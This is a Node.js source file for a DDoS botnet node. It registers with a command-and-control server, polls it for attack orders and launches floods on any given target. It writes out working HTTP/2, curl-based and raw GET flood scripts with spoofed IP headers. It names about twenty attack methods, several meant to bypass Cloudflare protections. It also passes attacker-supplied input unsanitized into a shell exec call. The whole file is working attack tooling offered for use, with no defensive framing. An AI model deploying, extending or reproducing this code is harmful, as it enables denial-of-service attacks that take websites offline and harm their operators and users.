const express = require('express');
const { exec, spawn } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// ========== GENERATE UNIQUE BOT ID ==========
function generateBotId() {
    const timestamp = Date.now().toString(36);
    const random = crypto.randomBytes(8).toString('hex');
    const pid = process.pid.toString(36);
    return `bot-${random}-${timestamp.slice(-6)}-${pid}`;
}

// ========== CONFIGURATION ==========
const BOT_ID = generateBotId();
const BOT_NAME = process.env.BOT_NAME || `Bot-${Math.floor(Math.random() * 10000)}`;
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://flood-of-noah-7bs7.onrender.com';
const PORT = 0; // random available port

let registrationAttempts = 0;
const MAX_REGISTRATION_ATTEMPTS = 5;
let activeProcesses = [];
let isBlocked = false;
let botUrl = '';
let serverPort = 0;

console.log(`\n${'='.repeat(60)}`);
console.log(`🤖 BOT STARTING`);
console.log(`${'='.repeat(60)}`);
console.log(`🆔 Bot ID: ${BOT_ID}`);
console.log(`📛 Bot Name: ${BOT_NAME}`);
console.log(`📡 Master Server: ${MASTER_SERVER}`);
console.log(`${'='.repeat(60)}\n`);

// ========== ENSURE METHODS ==========
function ensureMethods() {
    const methodsDir = path.join(__dirname, 'methods');
    if (!fs.existsSync(methodsDir)) {
        fs.mkdirSync(methodsDir, { recursive: true });
        console.log('[SETUP] Created methods directory');
    }

    // ===== H2-NUCLEAR.js =====
    const h2NuclearPath = path.join(methodsDir, 'h2-nuclear.js');
    if (!fs.existsSync(h2NuclearPath)) {
        const h2NuclearContent = `#!/usr/bin/env node
/**
 * HTTP/2 NUCLEAR FLOODER - Integrated into Bot
 * Usage: node h2-nuclear.js <target> <time> <connections> <threads>
 */

const http2 = require('http2');
const cluster = require('cluster');
const url = require('url');
const crypto = require('crypto');
const os = require('os');

// ================= CONFIG =================
const STATS_INTERVAL = 3000;
const MAX_STREAMS = 9999;
const CONNECTION_TIMEOUT = 10000;
const REQUEST_TIMEOUT = 8000;

// ================= HEADER POOL =================
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0',
    'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36',
];

const PATHS = [
    '/', '/api/', '/assets/', '/static/', '/images/', '/js/', '/css/',
    '/admin/', '/login/', '/dashboard/', '/profile/', '/settings/',
    '/search', '/data', '/view', '/page', '/post', '/get',
    '/upload', '/download', '/stream', '/video', '/audio',
    '/config', '/system', '/status', '/health', '/metrics', '/debug',
    '/auth', '/oauth', '/callback', '/webhook', '/socket',
    '/api/v1/', '/api/v2/', '/api/v3/',
];

// ================= GLOBAL STATS =================
const stats = {
    active: 0,
    ok: 0,
    fail: 0,
    sent: 0,
    resp: 0,
    goaway: 0,
    rst: 0,
    streams: 0
};

// ================= HELPERS =================
function rand(arr) { return arr[Math.floor(Math.random() * arr.length)]; }

function randomIP() {
    return \`\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}.\${Math.floor(Math.random()*255)}\`;
}

function randomString(len) {
    return crypto.randomBytes(len).toString('hex');
}

function randomPath() {
    let path = rand(PATHS);
    if (Math.random() > 0.5) {
        path += '?id=' + randomString(6);
        if (Math.random() > 0.5) {
            path += '&t=' + Date.now();
        }
    }
    return path;
}

function randomHeaders(host) {
    const ip = randomIP();
    return {
        ':method': 'GET',
        ':scheme': 'https',
        ':authority': host,
        ':path': randomPath(),
        'user-agent': rand(USER_AGENTS),
        'accept': rand(['text/html,*/*', 'application/json,*/*', '*/*']),
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': rand(['en-US,en;q=0.9', 'en-GB,en;q=0.9']),
        'cache-control': 'no-cache, no-store, must-revalidate',
        'pragma': 'no-cache',
        'x-forwarded-for': ip,
        'x-real-ip': ip,
        'x-request-id': randomString(16),
        'sec-ch-ua': '"Chromium";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': rand(['"Windows"', '"macOS"', '"Linux"']),
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'upgrade-insecure-requests': '1',
    };
}

// ================= NUCLEAR CONNECTION =================
class NuclearConnection {
    constructor(target, id) {
        this.id = id;
        this.target = target;
        this.session = null;
        this.alive = false;
        this.streamCount = 0;
        this.reconnectDelay = 100;
        this.parseTarget();
        this.connect();
    }

    parseTarget() {
        const parsed = url.parse(this.target);
        this.host = parsed.hostname;
        this.port = parsed.port || 443;
    }

    connect() {
        try {
            this.session = http2.connect(this.target, {
                rejectUnauthorized: false,
                timeout: CONNECTION_TIMEOUT,
                settings: {
                    maxConcurrentStreams: MAX_STREAMS,
                    initialWindowSize: 1048576,
                }
            });

            this.session.on('connect', () => {
                stats.active++;
                this.alive = true;
                this.reconnectDelay = 100;
                console.log(\`[CONN] \${this.id} CONNECTED\`);
                this.startFlood();
            });

            this.session.on('error', () => {
                stats.fail++;
                this.alive = false;
                this.reconnect();
            });

            this.session.on('close', () => {
                if (this.alive) stats.active--;
                this.alive = false;
                this.reconnect();
            });

            this.session.on('goaway', () => {
                stats.goaway++;
                if (this.alive) stats.active--;
                this.alive = false;
                this.reconnect();
            });

            this.session.on('stream', (stream) => {
                stats.resp++;
                stream.on('data', () => {});
                stream.on('end', () => {});
                stream.on('close', () => { stats.ok++; });
                stream.on('error', () => { stats.fail++; });
            });

        } catch (err) {
            stats.fail++;
            this.reconnect();
        }
    }

    startFlood() {
        const fire = () => {
            if (!this.alive || !this.session || this.session.destroyed) return;

            const batchSize = Math.min(50, MAX_STREAMS - this.streamCount);
            
            for (let i = 0; i < batchSize; i++) {
                if (!this.alive || !this.session || this.session.destroyed) return;

                try {
                    const headers = randomHeaders(this.host);
                    const stream = this.session.request(headers);
                    
                    stats.sent++;
                    stats.streams++;
                    this.streamCount++;

                    stream.setTimeout(REQUEST_TIMEOUT, () => {
                        try { stream.close(); } catch(e) {}
                    });

                    stream.on('response', () => { stats.resp++; });
                    stream.on('error', () => { stats.fail++; });
                    stream.on('close', () => {
                        stats.streams--;
                        this.streamCount--;
                    });

                } catch (err) {
                    stats.fail++;
                    if (err.code === 'ERR_HTTP2_STREAM_ERROR' || 
                        err.code === 'ERR_HTTP2_SESSION_ERROR') {
                        this.alive = false;
                        if (stats.active > 0) stats.active--;
                        this.reconnect();
                        return;
                    }
                }
            }

            setImmediate(fire);
        };

        for (let i = 0; i < 5; i++) {
            setImmediate(fire);
        }
    }

    reconnect() {
        if (this.reconnectDelay > 5000) return;

        setTimeout(() => {
            if (!this.alive) {
                this.reconnectDelay = Math.min(this.reconnectDelay * 1.5, 5000);
                this.connect();
            }
        }, this.reconnectDelay);
    }
}

// ================= WORKER =================
function startNuclearWorker(target, connectionCount, attackTime) {
    const connections = [];
    let startTime = Date.now();

    console.log(\`[💀 H2-NUCLEAR] pid=\${process.pid} conns=\${connectionCount} maxStreams=\${MAX_STREAMS}\`);

    for (let i = 0; i < connectionCount; i++) {
        const conn = new NuclearConnection(target, i);
        connections.push(conn);
    }

    const interval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const sentPerSec = elapsed > 0 ? Math.floor(stats.sent / elapsed) : 0;
        const respRate = stats.sent > 0 ? Math.round((stats.resp / stats.sent) * 1000) / 10 : 0;
        
        console.log(\`[💀 H2-NUCLEAR] active=\${stats.active} ok=\${stats.ok} fail=\${stats.fail} sent=\${stats.sent} resp=\${stats.resp} goaway=\${stats.goaway} rst=\${stats.rst} streams=\${stats.streams} | \${sentPerSec} req/s | \${respRate}% resp\`);
        
        if (stats.sent > 1000000 && stats.resp < 50000) {
            console.log(\`[💀 DOMINATION] Server response rate below 5% - target incapacitated\`);
        }
    }, STATS_INTERVAL);

    setTimeout(() => {
        clearInterval(interval);
        connections.forEach(c => { c.alive = false; if (c.session) c.session.close(); });
        console.log(\`[💀 H2-NUCLEAR] Attack complete - \${stats.sent} requests sent\`);
        process.exit(0);
    }, attackTime * 1000);
}

// ================= MAIN =================
const args = process.argv.slice(2);
const TARGET = args[0];
const TIME = parseInt(args[1]) || 60;
const CONNECTIONS = parseInt(args[2]) || 200;
const THREADS = parseInt(args[3]) || 4;

if (!TARGET) {
    console.log('Usage: node h2-nuclear.js <target> <time> <connections> <threads>');
    process.exit(1);
}

console.log(\`\\n💀 H2-NUCLEAR FLOOD | \${TARGET} | \${TIME}s | \${CONNECTIONS} conns | \${THREADS} threads\\n\`);

if (cluster.isMaster) {
    for (let i = 0; i < THREADS; i++) {
        const worker = cluster.fork();
        worker.send({ target: TARGET, connections: CONNECTIONS, time: TIME });
    }

    cluster.on('exit', (worker) => {
        const newWorker = cluster.fork();
        newWorker.send({ target: TARGET, connections: CONNECTIONS, time: TIME });
    });

    setTimeout(() => {
        process.exit(0);
    }, TIME * 1000 + 5000);

} else {
    process.on('message', (msg) => {
        if (msg.target && msg.connections) {
            startNuclearWorker(msg.target, msg.connections, msg.time);
        }
    });
}`;
        fs.writeFileSync(h2NuclearPath, h2NuclearContent);
        console.log('[SETUP] Created h2-nuclear.js');
    }

    // Create curl-stress.js
    const stressPath = path.join(methodsDir, 'curl-stress.js');
    if (!fs.existsSync(stressPath)) {
        const stressContent = `#!/usr/bin/env node
const { spawn } = require('child_process');

const TARGET = process.argv[2];
const TIME = parseInt(process.argv[3]) || 60;
const THREADS = 90;

if (!TARGET) {
    console.log('Usage: node curl-stress.js <target> <time>');
    process.exit(1);
}

console.log(\`\\n🔥 CURL STRESS FLOOD | \${TARGET} | \${TIME}s | \${THREADS} threads\\n\`);

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

let totalSent = 0;
let completedThreads = 0;
const startTime = Date.now();

function stressThread(threadId) {
    const ua = userAgents[threadId % userAgents.length];
    let running = true;
    let sent = 0;
    
    const sendSpam = () => {
        if (!running) return;
        
        const timestamp = Date.now();
        const random = Math.random().toString(36).substring(7);
        const url = \`\${TARGET}?t=\${timestamp}&r=\${random}&tid=\${threadId}\`;
        
        const args = [
            '-s', '-o', '/dev/null',
            '-H', \`User-Agent: \${ua}\`,
            '-H', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            '-H', 'Accept-Language: en-US,en;q=0.9',
            '-H', 'Accept-Encoding: gzip, deflate, br',
            '-H', 'Connection: keep-alive',
            '-H', 'Cache-Control: no-cache, no-store, must-revalidate',
            '--compressed',
            '--tcp-fastopen',
            '--connect-timeout', '2',
            '--max-time', '3',
            '--retry', '0',
            url
        ];
        
        const proc = spawn('curl', args, {
            detached: true,
            stdio: 'ignore'
        });
        proc.unref();
        sent++;
        totalSent++;
        
        if (running) {
            setImmediate(sendSpam);
        }
    };
    
    for (let i = 0; i < 10; i++) {
        sendSpam();
    }
    
    setTimeout(() => {
        running = false;
        completedThreads++;
        if (completedThreads === THREADS) {
            const elapsed = (Date.now() - startTime) / 1000;
            console.log(\`\\n✅ STRESS COMPLETE | Total: \${totalSent} | RPS: \${(totalSent/elapsed).toFixed(0)}\\n\`);
            process.exit(0);
        }
    }, TIME * 1000);
}

for (let i = 0; i < THREADS; i++) {
    stressThread(i + 1);
}

setTimeout(() => {
    if (completedThreads < THREADS) {
        process.exit(0);
    }
}, TIME * 1000 + 3000);`;
        fs.writeFileSync(stressPath, stressContent);
        console.log('[SETUP] Created curl-stress.js');
    }

    // Create raw-get.js
    const rawGetPath = path.join(methodsDir, 'raw-get.js');
    if (!fs.existsSync(rawGetPath)) {
        const rawGetContent = `#!/usr/bin/env node
const http = require('http');
const https = require('https');
const url = require('url');

const TARGET = process.argv[2];
const TIME = parseInt(process.argv[3]) || 60;
const THREADS = parseInt(process.argv[4]) || 20;
const RATE = parseInt(process.argv[5]) || 100;

if (!TARGET) {
    console.log('Usage: node raw-get.js <target> <time> [threads] [rate]');
    process.exit(1);
}

const parsed = new URL(TARGET);
const isHttps = parsed.protocol === 'https:';
const httpLib = isHttps ? https : http;

console.log(\`\\n🔥 RAW-GET | \${TARGET} | \${TIME}s | \${THREADS} threads | \${RATE} req/s\\n\`);

let totalSent = 0;
let completed = 0;

function sendRequests(threadId) {
    const agent = new httpLib.Agent({ keepAlive: true, maxSockets: Infinity, rejectUnauthorized: false });
    let running = true;
    let count = 0;
    const intervalMs = 1000 / RATE;
    
    const sendRequest = () => {
        if (!running) return;
        const req = httpLib.request({
            hostname: parsed.hostname,
            port: parsed.port || (isHttps ? 443 : 80),
            path: parsed.pathname + '?t=' + Date.now() + '&r=' + Math.random(),
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            },
            agent: agent,
            rejectUnauthorized: false
        }, (res) => { count++; totalSent++; res.resume(); });
        req.on('error', () => {});
        req.end();
        if (running) setTimeout(sendRequest, intervalMs);
    };
    
    for (let i = 0; i < 10; i++) sendRequest();
    
    setTimeout(() => {
        running = false;
        completed++;
        if (completed === THREADS) {
            console.log(\`\\n✅ RAW-GET COMPLETE | Total: \${totalSent}\\n\`);
            process.exit(0);
        }
    }, TIME * 1000);
}

for (let i = 0; i < THREADS; i++) {
    setTimeout(() => sendRequests(i + 1), i * 10);
}`;
        fs.writeFileSync(rawGetPath, rawGetContent);
        console.log('[SETUP] Created raw-get.js');
    }
}

ensureMethods();

// ========== HEALTH CHECK ==========
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        botId: BOT_ID,
        botName: BOT_NAME,
        timestamp: Date.now(),
        master: MASTER_SERVER,
        uptime: process.uptime(),
        activeAttacks: activeProcesses.length
    });
});

app.get('/ping', (req, res) => {
    res.json({
        alive: true,
        botId: BOT_ID,
        uptime: process.uptime(),
        timestamp: Date.now(),
        status: 'online'
    });
});

app.get('/attack', (req, res) => {
    const { target, time, methods } = req.query;
    if (!target || !time || !methods) {
        return res.status(400).json({ error: 'Missing parameters' });
    }
    console.log(`\n[RECEIVED] ${methods} -> ${target} for ${time}s`);
    res.status(200).json({ message: 'Attack command received', target, time, methods });
    executeAttack(target, time, methods);
});

// ========== START SERVER ==========
const server = app.listen(PORT, () => {
    const address = server.address();
    serverPort = address.port;
    botUrl = `http://localhost:${serverPort}`;
    console.log(`[INFO] Bot server running on port ${serverPort}`);
    console.log(`[INFO] Bot URL: ${botUrl}`);
    console.log(`[INFO] Bot ID: ${BOT_ID}`);
    console.log(`[INFO] Bot Name: ${BOT_NAME}\n`);
    setTimeout(() => {
        autoRegister();
    }, 2000);
});

// ========== AUTO-REGISTER ==========
async function autoRegister() {
    if (isBlocked) {
        console.log(`[BLOCKED] This bot has been permanently blocked`);
        process.exit(0);
    }

    if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
        console.log(`[WARN] Max registration attempts. Retry in 60s...`);
        setTimeout(() => {
            registrationAttempts = 0;
            autoRegister();
        }, 60000);
        return;
    }

    try {
        console.log(`[INFO] Registering... (Attempt ${registrationAttempts + 1}/${MAX_REGISTRATION_ATTEMPTS})`);
        console.log(`[INFO] Bot ID: ${BOT_ID}`);
        console.log(`[INFO] Bot Name: ${BOT_NAME}`);
        
        const response = await axios.post(`${MASTER_SERVER}/register`, {
            id: BOT_ID,
            name: BOT_NAME,
            url: botUrl
        }, {
            timeout: 10000,
            headers: { 'Content-Type': 'application/json' }
        });

        if (response.data && response.data.approved) {
            console.log(`[SUCCESS] ✅ Registered!`);
            console.log(`[INFO] Bot ID: ${BOT_ID}`);
            console.log(`[INFO] Ready for commands!\n`);
            
            setInterval(() => {
                checkForCommands();
            }, 3000);

            setInterval(() => {
                sendHeartbeat();
            }, 25000);
            
            return;
        } else {
            registrationAttempts++;
            setTimeout(() => autoRegister(), 5000);
        }
    } catch (error) {
        if (error.response && error.response.status === 403) {
            console.log(`[BLOCKED] Bot is blocked!`);
            isBlocked = true;
            process.exit(0);
            return;
        }
        registrationAttempts++;
        console.error(`[ERROR] Registration failed: ${error.message}`);
        setTimeout(() => autoRegister(), 5000);
    }
}

// ========== SEND HEARTBEAT ==========
async function sendHeartbeat() {
    try {
        await axios.post(`${MASTER_SERVER}/heartbeat`, { id: BOT_ID }, { timeout: 5000 });
    } catch (error) {
        // silently fail
    }
}

// ========== CHECK COMMANDS ==========
async function checkForCommands() {
    try {
        const response = await axios.get(`${MASTER_SERVER}/get-command`, {
            params: { botId: BOT_ID },
            timeout: 5000
        });

        if (response.data && response.data.hasCommand) {
            const command = response.data.command;
            if (command.action === 'stop') {
                console.log(`\n[STOP] Stopping all attacks`);
                stopAllAttacks();
            } else if (command.action === 'attack') {
                const { target, time, methods } = command;
                console.log(`\n[COMMAND] ${methods} -> ${target} for ${time}s`);
                executeAttack(target, time, methods);
            }
        }
    } catch (error) {
        // silently fail
    }
}

// ========== STOP ALL ==========
function stopAllAttacks() {
    console.log(`[STOP] Killing ${activeProcesses.length} processes`);
    activeProcesses.forEach(proc => {
        try { process.kill(-proc.pid); } catch (e) {}
        try { proc.kill(); } catch (e) {}
    });
    activeProcesses = [];
}

// ========== EXECUTE ATTACK ==========
function executeAttack(target, time, methods) {
    const execWithLog = (cmd) => {
        console.log(`[EXEC] ${cmd}`);
        const proc = exec(cmd, { detached: true }, (error, stdout, stderr) => {
            if (error && !error.message.includes('kill')) {
                console.error(`[ERROR] ${error.message}`);
            }
        });
        activeProcesses.push(proc);
        setTimeout(() => {
            const index = activeProcesses.indexOf(proc);
            if (index > -1) activeProcesses.splice(index, 1);
        }, parseInt(time) * 1000 + 5000);
    };

    console.log(`\n[ATTACK] Method: ${methods} | Target: ${target} | Time: ${time}s`);
    console.log('='.repeat(60));

    const methodsDir = path.join(__dirname, 'methods');

    switch(methods) {
        case 'H2-NUCLEAR':
        case 'H2N':
            execWithLog(`node ${path.join(methodsDir, 'h2-nuclear.js')} ${target} ${time} 200 4`);
            break;
        case 'H2N-MAX':
            execWithLog(`node ${path.join(methodsDir, 'h2-nuclear.js')} ${target} ${time} 500 8`);
            break;
        case 'RAW-GET':
            execWithLog(`node ${path.join(methodsDir, 'raw-get.js')} ${target} ${time} 20 100`);
            break;
        case 'CF-BYPASS':
            execWithLog(`node ${path.join(methodsDir, 'cf-bypass.js')} ${target} ${time} 4 32`);
            break;
        case 'MODERN-FLOOD':
            execWithLog(`node ${path.join(methodsDir, 'modern-flood.js')} ${target} ${time} 4 64`);
            break;
        case 'BYPASS':
            execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 10 90 proxy.txt`);
            break;
        case 'VHOLD':
            execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 15 2`);
            break;
        case 'W-FLOOD':
            execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3`);
            break;
        case 'STRESS':
        case 'CURL-SPAM':
            execWithLog(`node ${path.join(methodsDir, 'curl-stress.js')} ${target} ${time}`);
            break;
        case 'RAPID10':
        case 'R10':
            execWithLog(`node ${path.join(methodsDir, 'r10-rapid.js')} ${target} ${time} 30`);
            execWithLog(`node ${path.join(methodsDir, 'r10-tcp.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-tls.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-conn.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-header.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-frag.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-pipe.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-cookie.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-mixed.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'r10-lowcpu.js')} ${target} ${time}`);
            break;
        case 'HTTP-SICARIO':
            execWithLog(`node ${path.join(methodsDir, 'REX-COSTUM.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 10 90 proxy.txt`);
            execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time}`);
            break;
        case 'RAW-HTTP':
            execWithLog(`node ${path.join(methodsDir, 'h2-nust.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'http-panel.js')} ${target} ${time}`);
            break;
        case 'R9':
            execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3`);
            execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 15 2`);
            execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 10 90 proxy.txt`);
            break;
        case 'PRIV-TOR':
            execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 64 6`);
            execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 10 90 proxy.txt`);
            execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time}`);
            break;
        case 'HOLD-PANEL':
            execWithLog(`node ${path.join(methodsDir, 'http-panel.js')} ${target} ${time}`);
            break;
        case 'R1':
            execWithLog(`node ${path.join(methodsDir, 'vhold.js')} ${target} ${time} 15 2`);
            execWithLog(`node ${path.join(methodsDir, 'high-dstat.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'cibi.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'BYPASS.js')} ${target} ${time} 10 90 proxy.txt`);
            execWithLog(`node ${path.join(methodsDir, 'REX-COSTUM.js')} ${target} ${time}`);
            execWithLog(`node ${path.join(methodsDir, 'w-flood1.js')} ${target} ${time} 8 3`);
            execWithLog(`node ${path.join(methodsDir, 'nust.js')} ${target} ${time}`);
            break;
        case 'UAM':
            execWithLog(`node ${path.join(methodsDir, 'uam.js')} ${target} ${time}`);
            break;
        case 'W.I.L':
            execWithLog(`node ${path.join(methodsDir, 'wil.js')} ${target} ${time}`);
            break;
        default:
            console.log(`[ERROR] Unknown method: ${methods}`);
            console.log(`[INFO] Available: H2-NUCLEAR, H2N, H2N-MAX, RAW-GET, CF-BYPASS, MODERN-FLOOD, BYPASS, VHOLD, W-FLOOD, STRESS, RAPID10, R10, HTTP-SICARIO, RAW-HTTP, R9, PRIV-TOR, HOLD-PANEL, R1, UAM, W.I.L`);
    }

    console.log('='.repeat(60));
    console.log(`[ATTACK] ${methods} started on ${target}\n`);
}

// ========== SHUTDOWN ==========
process.on('SIGINT', () => {
    console.log('\n[SHUTDOWN] Cleaning up...');
    stopAllAttacks();
    server.close(() => {
        console.log('[SHUTDOWN] Server closed');
        process.exit(0);
    });
});

process.on('SIGTERM', () => {
    console.log('\n[SHUTDOWN] Cleaning up...');
    stopAllAttacks();
    server.close(() => {
        console.log('[SHUTDOWN] Server closed');
        process.exit(0);
    });
});

console.log('[INFO] Bot initialized. Waiting for server to start...\n');
